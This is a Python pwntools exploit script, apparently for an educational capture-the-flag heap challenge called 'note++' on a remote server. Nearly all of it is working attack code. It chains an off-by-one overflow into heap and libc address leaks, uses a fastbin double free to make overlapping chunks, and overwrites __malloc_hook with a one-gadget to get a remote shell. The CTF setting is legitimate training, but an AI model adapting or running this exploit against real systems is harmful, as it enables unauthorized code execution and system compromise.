#!/usr/bin/python3
from pwn import *

context.arch = 'amd64'
l = ELF('libc-2.23.so')

binary = remote('edu-ctf.csie.org', 10181)
#binary = process('./note++')
# pause()


def add(size, note, desc):
    binary.sendafter("> ", '1')
    binary.sendafter('Size: ', str(size))
    binary.sendafter('Note: ', note)
    binary.sendlineafter('Description of this note: ', desc)


def show():
    binary.sendafter("> ", '2')


def delete(index):
    binary.sendafter("> ", '3')
    binary.sendafter('Index: ', str(index))


# This chunk will contain the beginning of the overlapping chunk
add(0x68, b'0'*0x40 + b'\0'*8 + p64(0x71), 'backup')

# Chunk that overwrites the next chunk
add(0x68, '1', '1')
add(0x68, '2', '2')
add(0x68, 'end of the linked list', '3')

delete(3)
delete(2)
delete(1)

add(0x68, 'off-by-one', 'a'*48)  # reclaim chunk 1
show()  # leak the address of tail chunk
binary.recvuntil("Note 2:\n  Data: ")
tail_addr = u64(binary.recv(6) + b'\0\0')  # header
success("Tail chunk address -> %s" % hex(tail_addr))

delete(1)  # bypass glibc double free check
delete(2)  # double free
# Replace chunk 2's fd to before chunk 1 to create overlapping chunks
overlap_chunk = tail_addr - 0x100
add(0x68, p64(overlap_chunk), '1')  # reclaim chunk 2
add(0x68, '2', '2')                 # reclaim chunk 1
add(0x68, p64(overlap_chunk), '3')  # reclaim chunk 2 the second time

# malloc the overlapping chunk, which will overwrite original chunk 1's size to be bigger than fast bins
add(0x68, b'1'*0x10 + b'\0'*8 + p64(0xe1), 'overlap')  # note 4
delete(3)
delete(2)  # free the original chunk 1, which will be put into the unsorted bin

# refill chunk 1's description to overflow chunk 2's is_freed to 0
delete(0)  # bypass glibc double free check
delete(1)
add(0x68, b'0'*0x40 + b'\0'*8 + p64(0x71), 'backup')  # reclaim chunk 0
add(0x68, 'off-by-one', 'b'*48)

# leak libc address
show()
binary.recvuntil("Note 2:\n  Data: ")
l.address = u64(binary.recv(6) + b'\0\0') - 0x3c4b78
success("libc -> %s" % hex(l.address))

# second double free
delete(1)
delete(0)
add(0x68, 'off-by-one', 'a'*48)  # reclaim chunk 0
delete(0)
delete(1)

# Replace chunk 1's fd to in front of malloc hook
add(0x68, p64(l.sym.__malloc_hook - 0x10 - 3), '1')
add(0x68, '0', '0')
add(0x68, '1', '1')

# Replace malloc hook with one gadget
add(0x68, b'aaa' + p64(l.address + 0xf02a4), 'hook')
delete(4)

binary.interactive()
